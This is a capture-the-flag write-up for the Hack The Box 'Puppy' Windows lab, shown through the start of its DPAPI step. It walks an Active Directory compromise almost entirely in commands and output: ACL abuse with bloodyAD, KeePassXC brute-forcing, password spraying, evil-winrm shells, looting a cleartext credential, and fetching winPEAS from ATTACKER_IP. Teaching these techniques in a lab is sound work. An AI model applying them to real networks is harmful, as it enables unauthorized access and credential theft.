---
title: "🐶 HTB Puppy Write-up"
name: Puppy
date: 2025-09-28
difficulty: Medium
os: Windows
skills: "Enumeration, ACE Abuse, SMB Looting, Password Brute-force, Password Spraying, Disclosure of Sensitive Information, DPAPI Credential Looting, Privilege Escalation"
tools: "rustscan, nmap, nxc, bloodhound-python, BloodHound, bloodyAD, impacket-smbclient, brutalkeepass, evil-winrm, ncat, impacket-dpapi" 
published: true
---

![](images/Pasted%20image%2020250718065727.png)


```
Machine Information

As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!
```

## 📝 Summary

Using the supplied engagement credentials, I ran a BloodHound collector against the target Active Directory domain. A BloodHound query revealed an attack path: the user **Levi** could add himself to the `DEVELOPERS` group, which granted access to the `DEV` file share.  
On `DEV`, Levi discovered a **KeePassXC** vault. I extracted the vault and brute-forced the master password.  The vault revealed several passwords.

With those passwords, I brute-forced domain users and recovered credentials for **Ant Edwards**. Ant was able to **re-enable** a disabled account for **Adam Silver** and reset Adam’s password — giving me **WinRM** access to the server as Adam.

On the server, Adam could read files from `C:\Backups`.  The folder contained a backup file with a configuration file showing a cleartext credential for **Steph Cooper**.  Steph also had WinRM access; running winPEAS indicated saved **DPAPI** material in the profile.

I exfiltrated Steph’s DPAPI master key and credential blobs, decrypted the master key, and used it to decrypt the stored credentials. Those credentials belonged to Steph’s **Admin** account — an Administrator on the server — which completed the privilege escalation to full administrative control.

## 🔑 KeePassXC

### 🔎 Recon

The **initial scan** revealed open ports for a Windows Active Directory server, including access through WinRM port `5985/tcp`.
One thing that looks out of place was ports `111/tcp` and `2049/tcp`, which are NFS shares.  But this turned out to be a rabbit hole which led nowhere.

```
fcoomans@kali:~/htb/puppy$ rustscan -a 10.10.11.70 --tries 5 --ulimit 10000 -- -sCV -oA puppy_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.70:53
Open 10.10.11.70:88
Open 10.10.11.70:111
Open 10.10.11.70:135
Open 10.10.11.70:139
Open 10.10.11.70:389
Open 10.10.11.70:445
Open 10.10.11.70:464
Open 10.10.11.70:593
Open 10.10.11.70:2049
Open 10.10.11.70:3260
Open 10.10.11.70:636
Open 10.10.11.70:3268
Open 10.10.11.70:3269
Open 10.10.11.70:5985
Open 10.10.11.70:9389
Open 10.10.11.70:49664
Open 10.10.11.70:49669
Open 10.10.11.70:49667
Open 10.10.11.70:49674
Open 10.10.11.70:49689
Open 10.10.11.70:63599
Open 10.10.11.70:63817
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA puppy_tcp_all" on ip 10.10.11.70
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 17:29 SAST

<SNIP>

Nmap scan report for 10.10.11.70
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2025-07-17 17:29:03 SAST for 171s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-17 18:31:07Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3260/tcp  open  iscsi?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63599/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63817/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

After pointing `puppy.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/puppy$ grep puppy.htb /etc/hosts
10.10.11.70     puppy.htb
```

I ran an `nmap` UDP port scan, which detected UDP-related Windows Active Directory services and the NFS services.

```
fcoomans@kali:~/htb/puppy$ nmap --top-ports 100 --open -sU puppy.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 17:32 SAST
Nmap scan report for puppy.htb (10.10.11.70)
Host is up (0.17s latency).
Not shown: 95 open|filtered udp ports (no-response)
PORT     STATE SERVICE
53/udp   open  domain
88/udp   open  kerberos-sec
111/udp  open  rpcbind
123/udp  open  ntp
2049/udp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds
```

Using `nxc` to check the provided credentials revealed the name of the domain controller.

```
fcoomans@kali:~/htb/puppy$ nxc smb puppy.htb -u levi.james -p KingofAkron2025!
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
```

`dc.puppy.htb` was also added to `/etc/hosts`.

```
fcoomans@kali:~/htb/puppy$ grep puppy.htb /etc/hosts
10.10.11.70     puppy.htb dc.puppy.htb
```

Levi couldn't access the NFS shares, and this turned out to be a rabbit hole, as already mentioned.

```
fcoomans@kali:~/htb/puppy$ showmount -e dc.puppy.htb
Export list for dc.puppy.htb:
```

`nxc` printed the available SMB shares on the server.

```
fcoomans@kali:~/htb/puppy$ nxc smb dc.puppy.htb -u levi.james -p KingofAkron2025! --shares
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```

As well as the domain users.

```
fcoomans@kali:~/htb/puppy$ nxc ldap dc.puppy.htb -u levi.james -p KingofAkron2025! --users
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
LDAP        10.10.11.70     389    DC               [*] Enumerated 9 domain users: PUPPY.HTB
LDAP        10.10.11.70     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.10.11.70     389    DC               Administrator                 2025-02-19 21:33:28 0        Built-in account for administering the computer/domain
LDAP        10.10.11.70     389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.10.11.70     389    DC               krbtgt                        2025-02-19 13:46:15 0        Key Distribution Center Service Account
LDAP        10.10.11.70     389    DC               levi.james                    2025-02-19 14:10:56 5
LDAP        10.10.11.70     389    DC               ant.edwards                   2025-02-19 14:13:14 0
LDAP        10.10.11.70     389    DC               adam.silver                   2025-07-17 20:34:29 0
LDAP        10.10.11.70     389    DC               jamie.williams                2025-02-19 14:17:26 5
LDAP        10.10.11.70     389    DC               steph.cooper                  2025-02-19 14:21:00 5
LDAP        10.10.11.70     389    DC               steph.cooper_adm              2025-03-08 17:50:40 5
```

And confirmed that there was no lockout policy set on the domain.  This meant that brute-forcing passwords wouldn't lock any accounts.

```
fcoomans@kali:~/htb/puppy$ nxc smb dc.puppy.htb -u levi.james -p KingofAkron2025! --pass-pol
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.10.11.70     445    DC               [+] Dumping password info for domain: PUPPY
SMB         10.10.11.70     445    DC               Minimum password length: 7
SMB         10.10.11.70     445    DC               Password history length: 24
SMB         10.10.11.70     445    DC               Maximum password age: 41 days 23 hours 53 minutes
SMB         10.10.11.70     445    DC
SMB         10.10.11.70     445    DC               Password Complexity Flags: 000001
SMB         10.10.11.70     445    DC                   Domain Refuse Password Change: 0
SMB         10.10.11.70     445    DC                   Domain Password Store Cleartext: 0
SMB         10.10.11.70     445    DC                   Domain Password Lockout Admins: 0
SMB         10.10.11.70     445    DC                   Domain Password No Clear Change: 0
SMB         10.10.11.70     445    DC                   Domain Password No Anon Change: 0
SMB         10.10.11.70     445    DC                   Domain Password Complex: 1
SMB         10.10.11.70     445    DC
SMB         10.10.11.70     445    DC               Minimum password age: 1 day 4 minutes
SMB         10.10.11.70     445    DC               Reset Account Lockout Counter: 30 minutes
SMB         10.10.11.70     445    DC               Locked Account Duration: 30 minutes
SMB         10.10.11.70     445    DC               Account Lockout Threshold: None
SMB         10.10.11.70     445    DC               Forced Log off Time: Not Set
```

The groups and group membership were printed, once again using `nxc`.

```
fcoomans@kali:~/htb/puppy$ nxc ldap dc.puppy.htb -u levi.james -p KingofAkron2025! --groups |grep -v "membercount: 0"
LDAP                     10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP                     10.10.11.70     389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
LDAP                     10.10.11.70     389    DC               Administrators                           membercount: 4
LDAP                     10.10.11.70     389    DC               Users                                    membercount: 3
LDAP                     10.10.11.70     389    DC               Guests                                   membercount: 2
LDAP                     10.10.11.70     389    DC               Remote Management Users                  membercount: 2
LDAP                     10.10.11.70     389    DC               Schema Admins                            membercount: 1
LDAP                     10.10.11.70     389    DC               Enterprise Admins                        membercount: 1
LDAP                     10.10.11.70     389    DC               Domain Admins                            membercount: 1
LDAP                     10.10.11.70     389    DC               Group Policy Creator Owners              membercount: 1
LDAP                     10.10.11.70     389    DC               Pre-Windows 2000 Compatible Access       membercount: 1
LDAP                     10.10.11.70     389    DC               Windows Authorization Access Group       membercount: 1
LDAP                     10.10.11.70     389    DC               Denied RODC Password Replication Group   membercount: 8
LDAP                     10.10.11.70     389    DC               HR                                       membercount: 1
LDAP                     10.10.11.70     389    DC               SENIOR DEVS                              membercount: 1
LDAP                     10.10.11.70     389    DC               DEVELOPERS                               membercount: 3

fcoomans@kali:~/htb/puppy$ nxc ldap dc.puppy.htb -u levi.james -p KingofAkron2025! --groups "Administrators"
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
LDAP        10.10.11.70     389    DC               Stephen A. Cooper_adm
LDAP        10.10.11.70     389    DC               Domain Admins
LDAP        10.10.11.70     389    DC               Enterprise Admins
LDAP        10.10.11.70     389    DC               Administrator

fcoomans@kali:~/htb/puppy$ nxc ldap dc.puppy.htb -u levi.james -p KingofAkron2025! --groups "Remote Management Users"
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
LDAP        10.10.11.70     389    DC               Stephen W. Cooper
LDAP        10.10.11.70     389    DC               Adam D. Silver

fcoomans@kali:~/htb/puppy$ nxc ldap dc.puppy.htb -u levi.james -p KingofAkron2025! --groups "HR"
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
LDAP        10.10.11.70     389    DC               Levi B. James

fcoomans@kali:~/htb/puppy$ nxc ldap dc.puppy.htb -u levi.james -p KingofAkron2025! --groups "SENIOR DEVS"
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
LDAP        10.10.11.70     389    DC               Anthony J. Edwards

fcoomans@kali:~/htb/puppy$ nxc ldap dc.puppy.htb -u levi.james -p KingofAkron2025! --groups "DEVELOPERS"
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
LDAP        10.10.11.70     389    DC               Jamie S. Williams
LDAP        10.10.11.70     389    DC               Adam D. Silver
LDAP        10.10.11.70     389    DC               Anthony J. Edwards
```

The `bloodhound-python` BloodHound collector was run, and the results were ingested into BloodHound.

```
fcoomans@kali:~/htb/puppy$ bloodhound-python --zip -ns 10.10.11.70 -d puppy.htb -c All --dns-tcp -u levi.james -p KingofAkron2025!
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 00M 36S
INFO: Compressing output into 20250717205117_bloodhound.zip
```

BloodHound showed that Levi had `GenericWrite` on the `DEVELOPERS` group.  Group membership in this group could potentially give Levi access to the `DEV` SMB share.

![](images/Pasted%20image%2020250717135903.png)

### 🧪 Exploitation

#### 📂 DEV share access

`bloodyAD` was used to add Levi to the `DEVELOPERS` group.

```
fcoomans@kali:~/htb/puppy$ bloodyAD --host dc.puppy.htb -d puppy.htb -u levi.james -p 'KingofAkron2025!' get object --attr member DEVELOPERS

distinguishedName: CN=DEVELOPERS,DC=PUPPY,DC=HTB
member: CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB; CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB; CN=Anthony J. Edwards,DC=PUPPY,DC=HTB

fcoomans@kali:~/htb/puppy$ bloodyAD --host dc.puppy.htb -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
[+] levi.james added to DEVELOPERS

fcoomans@kali:~/htb/puppy$ bloodyAD --host dc.puppy.htb -d puppy.htb -u levi.james -p 'KingofAkron2025!' get object --attr member DEVELOPERS

distinguishedName: CN=DEVELOPERS,DC=PUPPY,DC=HTB
member: CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB; CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB; CN=Anthony J. Edwards,DC=PUPPY,DC=HTB; CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
```

And Levi could now access the `DEV` share.

```
fcoomans@kali:~/htb/puppy$ nxc smb dc.puppy.htb -u levi.james -p KingofAkron2025! --shares
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```

`impacket-smbclient` was used to access the `DEV` share, which contained a KeePassXC password vault.  I downloaded a copy of this password database.

```
fcoomans@kali:~/htb/puppy$ impacket-smbclient 'puppy.htb/levi.james:KingofAkron2025!@dc.puppy.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
DEV
IPC$
NETLOGON
SYSVOL
# use DEV
# tree
/KeePassXC-2.7.9-Win64.msi
/recovery.kdbx
Finished - 1 files and folders
# get recovery.kdbx
# exit
```

#### 🔓 Cracking the KeePassXC master password

And then I found that the vault was not a KeePass vault, but a KeePassXC vault.  The master password for KeePassXC cannot be as easily cracked using John or Hashcat.

```
fcoomans@kali:~/htb/puppy$ keepass2john recovery.kdbx
! recovery.kdbx : File version '40000' is currently not supported!
```

But then I found the `brutalkeepass` program written by `toneillcodes` on GitHub.  

This tool can be used to crack KeePassXC passwords by trying each password in a wordlist and then checking if the vault was unlocked with the password.  This is **much** slower than a John or Hashcat hash password crack, due to KeePassXC's built-in anti-brute-forcing mechanisms, but I didn't have any other choice but to test this tool.

I cloned the repo found from https://github.com/toneillcodes/brutalkeepass/, setup a Python virtual environment and installed the package dependencies/requirements.

```
fcoomans@kali:~/htb/puppy$ git clone https://github.com/toneillcodes/brutalkeepass.git
Cloning into 'brutalkeepass'...
remote: Enumerating objects: 63, done.
remote: Counting objects: 100% (63/63), done.
remote: Compressing objects: 100% (61/61), done.
remote: Total 63 (delta 17), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (63/63), 22.22 KiB | 4.44 MiB/s, done.
Resolving deltas: 100% (17/17), done.

fcoomans@kali:~/htb/puppy$ cd brutalkeepass

fcoomans@kali:~/htb/puppy/brutalkeepass$ python -m venv brutalkeepass

fcoomans@kali:~/htb/puppy/brutalkeepass$ . ./brutalkeepass/bin/activate

(brutalkeepass)fcoomans@kali:~/htb/puppy/brutalkeepass$ pip install -r requirements.txt
Collecting pykeepass==4.1.1.post1 (from -r requirements.txt (line 1))
```

Running the brute-force tool with the `rockyou.txt` wordlist, cracked the weak master password as `liverpool`.

```
(brutalkeepass)fcoomans@kali:~/htb/puppy/brutalkeepass$ python bfkeepass.py -d ../recovery.kdbx -w /usr/share/wordlists/rockyou.txt
[*] Running bfkeepass
[*] Starting bruteforce process...
[!] Success! Database password: liverpool
[*] Stopping bruteforce process.
[*] Done.
```

I unlocked the Password Vault with KeePassXC using the password `liverpool`.

![](images/Pasted%20image%2020250717142211.png)

The domain users were then added to the `domain_users.txt` file, and the passwords from the Vault were added to the `passwords.txt` file.

```
fcoomans@kali:~/htb/puppy$ cat domain_users.txt
Administrator
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm

fcoomans@kali:~/htb/puppy$ cat passwords.txt
KingofAkron2025!
HJKL2025!
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
```

### 💰 Post Exploitation

I used `nxc` to brute-force the domain users using the vault passwords.  The brute-force revealed that Ant Edwards' password was `Antman2025!`.

```
fcoomans@kali:~/htb/puppy$ nxc smb dc.puppy.htb -u domain_users.txt -p passwords.txt |grep +
SMB                      10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
```

## 🐜 From Ant to Adam

### 🔎 Recon

BloodHound showed that Ant Edwards had `GenericAll` rights to the Adam Silver user account.  This allowed Ant to change Adam's password.  Adam was a member of the `Remote Management Users` group, which would give me a foothold via WinRM on the server.

![](images/Pasted%20image%2020250717143210.png)

But Adam's account was disabled...

![](images/Pasted%20image%2020250717171737.png)

### 🧪 Exploitation

#### 🔼 PrivEsc to Adam Silver

I used `bloodyAD` with Ant's credentials to enable Adam's account.

```
fcoomans@kali:~/htb/puppy$ bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' get object --attr userAccountControl adam.silver

distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD

fcoomans@kali:~/htb/puppy$ bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac -f ACCOUNTDISABLE adam.silver
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl

fcoomans@kali:~/htb/puppy$ bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' get object --attr userAccountControl adam.silver

distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

And then set Adam's password to the temporary password `Password123!`.

```
fcoomans@kali:~/htb/puppy$ bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'Password123!'
[+] Password changed successfully!

fcoomans@kali:~/htb/puppy$ nxc ldap dc.puppy.htb -u adam.silver -p 'Password123!'
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\adam.silver:Password123!
```

`evil-winrm` was then used to log in to the server as user Adam Silver.

```
fcoomans@kali:~/htb/puppy$ evil-winrm -i dc.puppy.htb -u adam.silver -p 'Password123!'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami
puppy\adam.silver
```

### 💰 Post Exploitation
#### 🚩 user.txt

Adam Silver holds the `user.txt` flag.

```
*Evil-WinRM* PS C:\Users\adam.silver\Documents> type C:\Users\adam.silver\Desktop\user.txt
9c52aa3cd44cb4fb78a3a783747ee78f
```

## 💾 Backup leaks sensitive information

### 🔎 Recon

Adam didn't have any notable privileges or group memberships.

```
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
PUPPY\DEVELOPERS                            Group            S-1-5-21-1487982659-1829050783-2281216199-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

But he did have read access to the `C:\Backups` folder, which contained a site backup.  I downloaded the backup to `loot/backup.zip` on the attack host.

```
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd \Backups
*Evil-WinRM* PS C:\Backups> icacls *
site-backup-2024-12-30.zip NT AUTHORITY\SYSTEM:(I)(F)
                           BUILTIN\Administrators:(I)(F)
                           BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip loot/backup.zip

Info: Downloading C:\Backups\site-backup-2024-12-30.zip to loot/backup.zip

Info: Download successful!
```

### 🧪 Exploitation

The backup was unzipped.

```
fcoomans@kali:~/htb/puppy$ cd loot

fcoomans@kali:~/htb/puppy/loot$ ls
backup.zip

fcoomans@kali:~/htb/puppy/loot$ unzip backup.zip
Archive:  backup.zip
   creating: puppy/
  inflating: puppy/nms-auth-config.xml.bak

<SNIP>
```

#### 🔼 PrivEsc to Steph Cooper

The `nms-auth-config.xml.bak` config file leaked the cleartext password for user Steph Cooper.  The password was `ChefSteph2025!`.

```
fcoomans@kali:~/htb/puppy/loot$ cd puppy

fcoomans@kali:~/htb/puppy/loot/puppy$ ls
assets  images  index.html  nms-auth-config.xml.bak

fcoomans@kali:~/htb/puppy/loot/puppy$ cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>

<SNIP>
```

`nxc` confirmed that the password was still valid.

```
fcoomans@kali:~/htb/puppy/loot/puppy$ nxc ldap dc.puppy.htb -u steph.cooper -p ChefSteph2025!
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025!
```

### 💰 Post Exploitation

Steph Cooper was also a member of the `Remote Management Users` group.  `evil-winrm` was used to login to the server as user Steph Cooper.

```
fcoomans@kali:~/htb/puppy$ evil-winrm -i dc.puppy.htb -u steph.cooper -p ChefSteph2025!

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> whoami
puppy\steph.cooper
```

## 🛡️ DPAPI Credentials

### 🔎 Recon

I shared winpeas on the attack host,

```
fcoomans@kali:~/htb/puppy$ python -m http.server -d /usr/share/peass/winpeas
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And download it on the target.

```
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> cd $env:temp
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Local\Temp> iwr http://ATTACKER_IP:8000/winPEASx64.exe -outfile winpeas.exe
```

`winpeas` found that there were potentially DPAPI encrypted passwords saved for user Steph Cooper.

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Local\Temp> .\winpeas.exe

<SNIP>

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
